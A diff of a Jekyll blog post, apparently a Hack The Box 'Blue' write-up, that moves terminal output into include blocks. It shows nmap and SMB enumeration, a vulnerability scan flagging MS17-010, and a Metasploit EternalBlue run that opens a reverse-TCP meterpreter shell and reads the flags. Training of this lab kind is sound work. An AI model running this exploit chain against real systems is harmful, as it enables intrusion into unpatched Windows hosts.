@@ -27,8 +27,7 @@ Eternal Blue, MS17-010.  Just a quick metasploit hit.
 
 Running nmap and getting the open ports.
 
-{% raw %}
-```sh
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/htb/blue]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.40                  
 [sudo] password for kali: 
@@ -48,14 +47,17 @@ PORT      STATE SERVICE      VERSION
 49157/tcp open  msrpc        Microsoft Windows RPC
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=nmap %}
 
 <br />
 Use smbclient -L to list the shares running on the smb.
 
-{% raw %}
-```sh
+{% capture smblist %}
 ┌──(kali㉿kali)-[~/Documents/htb/blue]
 └─$ smbclient -L //10.10.10.40/                 
 Password for [WORKGROUP\kali]:
@@ -70,14 +72,17 @@ Password for [WORKGROUP\kali]:
 Reconnecting with SMB1 for workgroup listing.
 do_connect: Connection to 10.10.10.40 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
 Unable to connect with SMB1 -- no workgroup available
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=smblist %}
 
 <br />
 Check the Share share with smbclient.
 
-{% raw %}
-```sh
+{% capture smbsharelisting %}
 ┌──(kali㉿kali)-[~/Documents/htb/blue]
 └─$ smbclient //10.10.10.40/Share
 Password for [WORKGROUP\kali]:
@@ -87,14 +92,17 @@ smb: \> ls
   ..                                  D        0  Fri Jul 14 23:48:44 2017
 
                 4692735 blocks of size 4096. 593022 blocks available
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=smbsharelisting %}
 
 <br />
 List the files available on the Users share.  Appears to be the C:\Users folder.
 
-{% raw %}
-```sh
+{% capture smbuserslisting %}
 ┌──(kali㉿kali)-[~/Documents/htb/blue]
 └─$ smbclient //10.10.10.40/Users
 Password for [WORKGROUP\kali]:
@@ -105,14 +113,17 @@ smb: \> ls
   Default                           DHR        0  Tue Jul 14 17:07:31 2009
   desktop.ini                       AHS      174  Tue Jul 14 14:54:24 2009
   Public                             DR        0  Tue Apr 12 17:51:29 2011
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=smbuserslisting %}
 
 <br />
 Run the vuln category of the nmap script and notice the vulnerability to ms17-010.
 
-{% raw %}
-```sh
+{% capture vulnchk %}
 ┌──(kali㉿kali)-[~/Documents/htb/blue]
 └─$ nmap --script vuln -oN vulnchk 10.10.10.40   
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-18 13:26 AEDT
@@ -149,24 +160,30 @@ Host script results:
 |_smb-vuln-ms10-054: false
 
 Nmap done: 1 IP address (1 host up) scanned in 110.89 seconds                             DR        0  Tue Apr 12 17:51:29 2011
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=vulnchk %}
 
 <br />
 Start msfconsole.  Note, the q means quiet mode.  It suppress the ascii art logo.
 
-{% raw %}
-```sh
+{% capture startmsf %}
 └──╼ [★]$ msfconsole -q
 [msf](Jobs:0 Agents:0) >>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=startmsf %}
 
 <br />
 Seach metasploit for ms17-010 for potential exploits.
 
-{% raw %}
-```sh
+{% capture searchblue %}
 [msf](Jobs:0 Agents:0) >> search ms17-010
 
 Matching Modules
@@ -185,14 +202,17 @@ Interact with a module by name or index. For example info 4, use 4 or use exploi
 
 [msf](Jobs:0 Agents:0) >> use exploit/windows/smb/ms17_010_eternalblue
 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=searchblue %}
 
 <br />
 Use show options to see all of the options for this exploit.  Notice that rhosts is required so the exploit knows who to attack.  Also set lhost to the IP address to the IP address of the tun0 interface.
 
-{% raw %}
-```sh
+{% capture showoptions %}
 [msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> show options
 
 Module options (exploit/windows/smb/ms17_010_eternalblue):
@@ -236,14 +256,17 @@ lhost => 10.10.14.29
 [msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set lhost tun0
 lhost => 10.10.14.29
 [msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=showoptions %}
 
 <br />
 Run the exploit.
 
-{% raw %}
-```sh
+{% capture runexploit %}
 msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
 [*] Started reverse TCP handler on 10.10.16.3:4444 
 [*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
@@ -276,29 +299,43 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
 [+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 
 meterpreter >
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=runexploit %}
 
 <br />
 Drop into a shell.
 
-{% raw %}
-```sh
+{% capture dropshell %}
 meterpreter > shell
 Process 2676 created.
 Channel 1 created.
+{% endcapture %}
+
+{% capture windowsshell %}
 Microsoft Windows [Version 6.1.7601]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
 C:\Windows\system32>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=dropshell %}
+
+{% include terminal.html
+   language="cmd"
+   title="cmd.exe"
+   content=windowsshell %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```sh
+{% capture userflag %}
 C:\Users\haris\Desktop>type user.txt
 type user.txt
 <redacted>
@@ -329,14 +366,17 @@ Tunnel adapter Teredo Tunneling Pseudo-Interface:
 
    Media State . . . . . . . . . . . : Media disconnected
    Connection-specific DNS Suffix  . :
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="cmd"
+   title="cmd.exe"
+   content=userflag %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```sh
+{% capture rootflag %}
 C:\Users\Administrator\Desktop>type root.txt
 type root.txt
 <redacted>
@@ -366,8 +406,12 @@ Tunnel adapter isatap.{CBC67B8A-5031-412C-AEA7-B3186D30360E}:
 Tunnel adapter Teredo Tunneling Pseudo-Interface:
 
    Media State . . . . . . . . . . . : Media disconnected
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="cmd"
+   title="cmd.exe"
+   content=rootflag %}
 
 <br />
 If you really like metasploit blue, I have a THM box doing it too.
